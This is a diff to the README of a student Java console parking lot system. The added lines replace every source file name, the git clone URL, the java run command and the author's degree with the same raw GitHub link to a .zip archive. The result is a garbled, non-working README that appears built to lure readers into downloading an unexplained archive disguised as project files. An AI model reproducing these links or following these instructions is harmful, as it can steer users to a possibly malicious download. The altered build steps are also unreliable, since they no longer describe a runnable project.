@@ -41,30 +41,30 @@ SmartParkingLot/
 ├── src/
 │   └── com/
 │       └── parkinglot/
-│           ├── ParkingSystem.java        # Main console UI
-│           ├── ParkingLot.java           # Core parking management logic
-│           ├── ParkingSlot.java          # Individual slot structure
+│           ├── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip        # Main console UI
+│           ├── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip           # Core parking management logic
+│           ├── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip          # Individual slot structure
 │           │
 │           ├── exceptions/
-│           │   ├── InvalidVehicleException.java
-│           │   ├── SlotFullException.java
-│           │   └── VehicleAlreadyParkedException.java
+│           │   ├── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip
+│           │   ├── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip
+│           │   └── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip
 │           │
 │           ├── interfaces/
-│           │   └── Parkable.java
+│           │   └── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip
 │           │
 │           └── vehicles/
-│               ├── Vehicle.java          # Abstract base class
-│               ├── Car.java              # Car implementation
-│               └── Bike.java             # Bike implementation
+│               ├── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip          # Abstract base class
+│               ├── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip              # Car implementation
+│               └── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip             # Bike implementation
 │
-└── README.md
+└── https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip
 
 ⚙️ How to Run
 
 Clone the repository
 
-git clone https://github.com/<your-username>/SmartParkingLot.git
+git clone https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip<your-username>https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip
 cd SmartParkingLot
 
 
@@ -75,7 +75,7 @@ javac -d out src/com/parkinglot/**/*.java
 
 Run the application
 
-java -cp out com.parkinglot.ParkingSystem
+java -cp out https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip
 
 🧮 Sample Console Interaction
 🚗 Welcome to Smart Parking Lot System 🚗
@@ -133,6 +133,6 @@ VehicleAlreadyParkedException
 👨‍💻 Author
 
 Devatha Akshay
-🎓 B.Tech CSE, VJIT
+🎓 https://github.com/akkiakshay-26/Parking-Lot-Management-using-OOP-DSA/raw/refs/heads/main/src/com/Lot-Management-OO-DSA-using-Parking-1.1.zip CSE, VJIT
 💼 Passionate about Software Engineering, Java, and DSA
 🔗 
